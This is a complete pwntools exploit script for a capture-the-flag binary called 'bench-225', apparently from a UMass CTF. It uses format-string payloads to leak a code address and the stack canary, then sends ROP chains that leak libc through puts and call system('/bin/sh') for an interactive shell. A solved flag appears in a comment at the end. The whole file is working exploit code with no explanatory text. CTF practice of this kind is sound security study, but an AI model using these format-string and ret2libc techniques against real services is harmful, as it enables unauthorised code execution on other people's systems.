#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./bench-225_patched")
libc = ELF("./libc.6.so")

context.binary = exe

REMOTE_NC_CMD    = "nc bench-225.ctf.umasscybersec.org 1337"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
b *motivation+167
c
c
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    r = conn()

    for i in range(7):
        r.sendline(b"3")
    for i in range(5):
        r.sendline(b"4")
    r.clean()

    payload = b"%11$p"

    r.sendline(b"6")
    r.sendline(payload)

    r.recvuntil(b"Quote: ")
    leak = int(r.recvline()[1:-1],16)
    exe.address = leak - exe.sym.main - 837

    POP_RDI = p64(0x0000000000001336+exe.address)

    payload = b"%13$p"

    r.sendline(b"6")
    r.sendline(payload)
    r.recvuntil(b"Quote: ")
    canary = int(r.recvline()[1:-1],16)
    
    payload = b"AAAAAAA\x00" + p64(canary)*2 + POP_RDI + p64(exe.got.puts) + p64(exe.plt.puts) + p64(exe.sym.main)

    r.sendline(b"6")
    r.sendline(payload)
    for i in range(2):
        r.recvuntil(b"........................%%@%%@@*#@%@%@%#%###*%%##**##%##*#%%*##*##***#%#@%**#%@@*#%%%**++==+-==-----\n")

    leak = u64(r.recvline()[:-1].ljust(8, b"\x00"))
    libc.address = leak - libc.sym.puts  

    for i in range(7):
        r.sendline(b"3")
    for i in range(5):
        r.sendline(b"4")

    RET = p64(0x000000000000101a+exe.address)

    payload = b"AAAAAAA\x00" + p64(canary)*2 + POP_RDI + p64(libc.binsh()) + RET + p64(libc.sym.system) + p64(exe.sym.main)


    r.sendline(b"6")
    r.sendline(payload)

    r.interactive()
    #UMASS{wh0$e_g0nn4_c4rry_t3h_r0pz_&nd_d4_ch41nz?}

if __name__ == "__main__":
    main()